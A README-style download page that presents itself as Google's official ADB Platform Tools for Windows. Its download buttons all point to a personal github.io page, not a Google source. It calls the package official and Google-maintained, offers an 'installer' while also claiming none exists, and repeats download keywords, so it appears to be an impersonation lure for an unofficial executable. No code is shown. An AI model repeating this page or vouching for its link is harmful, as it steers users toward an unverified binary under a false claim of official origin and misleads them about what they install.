# ADB Platform Tools

<img src="https://play-lh.googleusercontent.com/LE2-8hjLVmfDhjBtFoLrJThiqRyT68O1jCKE9ZQWUGOGHGBq9BETGvrMzeOZijpE_B6WK5tCD-lEp8ezL3BogBg=w240-h480-rw" alt="ADB Platform Tools logo" width="120"/>

[![Download ADB Platform Tools](https://img.shields.io/badge/⬇_Download_ADB_Platform_Tools-8a2be2?style=for-the-badge)](https://edwardwhite23.github.io/.github/ADB-Platform-Tools-Download-App)

*ADB Platform Tools is an official Android developer toolkit for Windows that puts Google's adb and fastboot utilities directly on your desktop.*

**Current build:** The latest Android SDK Platform-Tools release Google publishes · **Platform:** Windows 10/11, 64-bit

<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRLMfnwQJgbIJYYl3sQws3tzfgjquiGf5G6VkQxzuDeELDkzPSZJ4VPkQ41&s=10" alt="ADB Platform Tools running on Windows"/>
*A Windows terminal window mid-way through an adb install command.*

## Highlights
- Ships adb and fastboot together in one small Google-maintained package
- Works from any Windows Command Prompt or PowerShell window, with no installer
- Updated by Google alongside each Android SDK revision

![ADB](https://img.shields.io/badge/Tag-ADB-8a2be2) ![Fastboot](https://img.shields.io/badge/Tag-Fastboot-8a2be2) ![Android](https://img.shields.io/badge/Tag-Android-8a2be2) ![Windows](https://img.shields.io/badge/Tag-Windows-8a2be2)

## Overview
A platform tools adb and fastboot download is really just this one small package: Google's official set of command-line binaries for talking to Android hardware from a Windows PC. It's aimed at developers, QA testers, and enthusiasts who need to install apps outside an app store, watch device logs, or flash images through fastboot. There's no window or wizard involved — you extract a folder and start typing commands. Because Google maintains it directly, it tracks new Android capabilities as they ship.

## Features
- [ ] Install, uninstall, and sideload APKs with adb
- [ ] Flash factory images and unlock tokens with fastboot
- [ ] Stream real-time device logs through `logcat`
- [ ] Open an interactive shell on a connected device
- [ ] Push and pull files between device and PC

## System Requirements
| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10, 64-bit | Windows 11, 64-bit |
| Processor | Any 64-bit processor Windows itself supports | Same — no extra CPU demand from the tools |
| Memory | Whatever Windows requires on its own | Same |
| Storage | A very small amount of free space | A little extra for downloaded device images |

## Installation
- [ ] Download the ADB Platform Tools archive using the button above.
- [ ] Extract it to a short, memorable path such as `C:\platform-tools`.
- [ ] Open a terminal window in that folder to begin running commands.

## Getting Started
1. Enable Developer Options and USB debugging on the Android device, then plug it into the PC over USB — this is the moment the device starts trusting the connection.
2. Open a terminal in the platform-tools folder and run `adb devices`, watching for the device to appear once the on-device authorization prompt is accepted.
3. From there, everyday work like installing an app with `adb install` or rebooting into fastboot mode is a single command away, and the routine becomes second nature after the first session.

## Latest Release
> **The current Android SDK Platform-Tools build** — the release Google actively maintains for this cycle. **[Download the installer](https://edwardwhite23.github.io/.github/ADB-Platform-Tools-Download-App)**

## FAQ
| Question | Answer |
|---|---|
| Is ADB Platform Tools free? | Yes — Google provides it at no cost as part of the standard Android SDK. |
| Do these platform tools adb download options work on any Windows PC? | Yes, any 64-bit Windows 10 or 11 machine with a USB port will run them; some devices need their manufacturer's USB driver too. |
| Is this the same as installing Android Studio? | No — Android Studio includes these same tools plus a full IDE; ADB Platform Tools is just the command-line pieces on their own. |

## Support
For help with ADB Platform Tools, check the release notes and documentation Google publishes with the Android SDK, which cover adb and fastboot usage and common troubleshooting steps. The official Android developer website is also worth consulting for driver help and setup guidance.

